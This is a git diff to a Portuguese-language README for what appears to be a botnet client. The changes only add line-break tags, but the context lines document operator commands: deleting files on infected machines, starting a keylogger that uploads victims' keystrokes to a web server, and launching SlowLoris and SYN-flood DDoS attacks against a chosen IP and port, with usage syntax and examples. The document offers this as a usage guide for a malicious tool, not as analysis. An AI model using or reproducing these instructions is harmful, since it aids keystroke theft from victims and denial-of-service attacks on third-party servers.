@@ -132,7 +132,7 @@ Diretório para o qual o .exe se copia para ser executado em persistência quand
 		$ USAGE: delete <arquivo> <nickdobot>
 		$ Ex: delete leak.txt DESKTOP-PC-3456
 
-- [keylog start] para ativar o keylogger
+- [keylog start] para ativar o keylogger <br>
   O arquivo de log será upado para o servidor web a cada 100 caracteres digitados. <br>
   Será iniciado um novo processo no sistema do BOT para o keylogger.		
 
@@ -148,7 +148,7 @@ Diretório para o qual o .exe se copia para ser executado em persistência quand
 		$ Ex: keylog stop wave
 		
 
-- [slow start] para ativar o ataque SlowLoris
+- [slow start] para ativar o ataque SlowLoris <br>
   Ataque DDoS à camada 7 de servidores web com o SlowLoris.
 		
 		$ USAGE: slow start <socket count> <ip> <port> [<botnick> || <wave>]
@@ -161,7 +161,7 @@ Diretório para o qual o .exe se copia para ser executado em persistência quand
 		$ Ex: slow stop DESKTOP-PC-3456
 		$ Ex: slow stop wave
 
-- [plum start] para ativar o ataque Syn Flood
+- [plum start] para ativar o ataque Syn Flood <br>
   Ataque DDoS à camada 4 de servidores com o Plum.
 		
 		$ USAGE: plum start  <plum start> <threads> <ip> <port> [<botnick> || <wave>]
